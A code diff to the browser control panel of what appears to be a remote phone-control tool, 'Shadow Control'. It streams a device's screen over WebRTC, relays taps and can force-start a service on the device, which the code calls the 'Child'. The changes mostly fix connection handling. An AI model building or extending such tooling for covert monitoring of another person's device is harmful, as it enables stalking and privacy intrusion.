@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Shadow Control v2.0</title>
+    <title>Shadow Control v2.0 (Fixed)</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
@@ -320,18 +320,16 @@
         let socket;
         let peerConnection;
         let currentDeviceId = null;
+        let candidateQueue = []; // Queue for early candidates
 
         // URL se Device ID nikalo
         const urlParams = new URLSearchParams(window.location.search);
         currentDeviceId = urlParams.get('id');
 
-        // 🔥🔥 UPDATED WebRTC Config (Matches Android Code) 🔥🔥
+        // 🔥🔥 WebRTC Config with OPENRELAY 🔥🔥
         const rtcConfig = {
             iceServers: [
-                // 1. Google STUN (Standard)
                 { urls: 'stun:stun.l.google.com:19302' },
-
-                // 2. OPENRELAY TURN (Ye Android code se match karta hai)
                 {
                     urls: "turn:openrelay.metered.ca:80",
                     username: "openrelayproject",
@@ -369,40 +367,79 @@
 
             socket.on("connect", () => {
                 setStatus(true);
-                console.log("✅ Connected. Joining Room:", currentDeviceId);
+                console.log("✅ Connected to Server. Joining Room:", currentDeviceId);
                 socket.emit("join-room", currentDeviceId);
             });
 
             socket.on("disconnect", () => setStatus(false));
 
-            // WebRTC Logic
+            // --- WebRTC Logic (Corrected) ---
             socket.on("offer", async (offer) => {
-                console.log("📩 Offer Received");
+                console.log("📩 Offer Received from Child");
                 loadingMsg.style.display = "none";
                 
-                if (peerConnection) peerConnection.close();
+                // 1. Reset Connection cleanly
+                if (peerConnection) {
+                    peerConnection.close();
+                }
                 peerConnection = new RTCPeerConnection(rtcConfig);
+                candidateQueue = []; // Clear queue
 
+                // 2. Setup Track Event
                 peerConnection.ontrack = event => {
+                    console.log("📺 Stream Track Received");
                     remoteVideo.srcObject = event.streams[0];
                     showToast("Video Feed Active");
                 };
 
+                // 3. Setup ICE Candidate Event
                 peerConnection.onicecandidate = event => {
                     if (event.candidate) {
                         socket.emit("candidate", { target: currentDeviceId, candidate: event.candidate });
                     }
                 };
 
-                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-                const answer = await peerConnection.createAnswer();
-                await peerConnection.setLocalDescription(answer);
+                try {
+                    // 4. Set Remote Description
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+                    console.log("✅ Remote Description Set");
 
-                socket.emit("answer", { target: currentDeviceId, answer: answer });
+                    // 5. Process Queued Candidates (Wait karne wale candidates ab add honge)
+                    while (candidateQueue.length > 0) {
+                        const c = candidateQueue.shift();
+                        await peerConnection.addIceCandidate(c);
+                        console.log("➕ Added Queued Candidate");
+                    }
+
+                    // 6. Create & Send Answer
+                    const answer = await peerConnection.createAnswer();
+                    await peerConnection.setLocalDescription(answer);
+                    
+                    console.log("📤 Sending Answer");
+                    socket.emit("answer", { target: currentDeviceId, answer: answer });
+
+                } catch (error) {
+                    console.error("❌ WebRTC Error:", error);
+                    showToast("Connection Failed");
+                }
             });
 
             socket.on("candidate", async (candidate) => {
-                if (peerConnection) await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+                try {
+                    const ice = new RTCIceCandidate(candidate);
+                    
+                    // Agar RemoteDescription set hai, to seedha add karo
+                    if (peerConnection && peerConnection.remoteDescription) {
+                        await peerConnection.addIceCandidate(ice);
+                        console.log("➕ ICE Candidate Added");
+                    } else {
+                        // Agar nahi set hai, to Queue mein dalo (Prevent Crash)
+                        console.log("⏳ Queueing Candidate (Waiting for Offer)");
+                        candidateQueue.push(ice);
+                    }
+                } catch (e) {
+                    console.error("❌ Error adding candidate:", e);
+                }
             });
         }
 
@@ -425,7 +462,6 @@
 
         function sendCmd(action) {
             if (!socket) return;
-            // Vibration Feedback
             if(navigator.vibrate) navigator.vibrate(30);
             
             console.log("Sending:", action);
@@ -438,7 +474,7 @@
         }
 
         function forceStart() {
-            sendCmd('start'); // Service ko force start karne ka signal
+            sendCmd('start'); 
             loadingMsg.innerHTML = "<i class='fa-solid fa-hourglass-half fa-spin'></i> Requesting Stream...";
         }
 
@@ -483,14 +519,13 @@
             const clickX = e.clientX - rect.left - startX;
             const clickY = e.clientY - rect.top - startY;
 
-            // Coordinates valid range ke bahar hain? (Black bars pe click kiya)
+            // Coordinates valid range ke bahar hain?
             if (clickX < 0 || clickX > drawWidth || clickY < 0 || clickY > drawHeight) return;
 
             // Scale to original resolution
             const finalX = Math.round((clickX / drawWidth) * remoteVideo.videoWidth);
             const finalY = Math.round((clickY / drawHeight) * remoteVideo.videoHeight);
 
-            // Visual Ripple
             createRipple(e.clientX, e.clientY);
 
             console.log(`Tap: ${finalX}, ${finalY}`);
@@ -522,7 +557,7 @@
             const elem = document.getElementById("videoContainer");
             if (!document.fullscreenElement) {
                 elem.requestFullscreen().catch(err => {
-                    alert(`Error attempting to enable fullscreen: ${err.message}`);
+                    console.log(`Error attempting to enable fullscreen: ${err.message}`);
                 });
             } else {
                 document.exitFullscreen();
